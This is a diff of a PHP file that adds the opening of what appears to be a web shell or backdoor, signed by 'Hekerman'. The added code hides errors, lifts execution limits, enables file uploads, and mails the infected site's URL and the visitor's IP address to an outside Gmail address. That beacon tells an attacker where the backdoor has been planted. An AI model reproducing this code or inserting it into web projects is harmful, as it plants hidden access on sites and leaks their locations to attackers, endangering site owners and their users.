@@ -1,17 +1,32 @@
-
-.<?php
-define('SECURE_ACCESS', true);
+<?php
+//coded by Hekerman 
+//Maklo heker
+//ganti $tujuanemail ya zeyenk
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'rootcyberpunks@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "MAKLO HEKER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+ 
+if(get_magic_quotes_gpc()){
+foreach($_POST as $key=>$value){
+$_POST[$key] = stripslashes($value);
+}
+}
+?>
+<?php
+error_reporting(0);
 ob_start();
+ini_set('file_uploads', 1);
 http_response_code(200);
 ini_set('lsapi_backend_off', '1');
 ini_set('file_uploads', '1');
 header('http_response_code', '200');
-ignore_user_abort(true);
 ini_set('memory_limit', '-1');
-set_time_limit(0);
-error_reporting(0);
-ini_set('display_errors', '0');
-ini_set('log_errors', '0');
 ini_set('max_execution_time', 5000);
 ini_set('default_charset', 'UTF-8');
 date_default_timezone_set('America/Sao_Paulo');
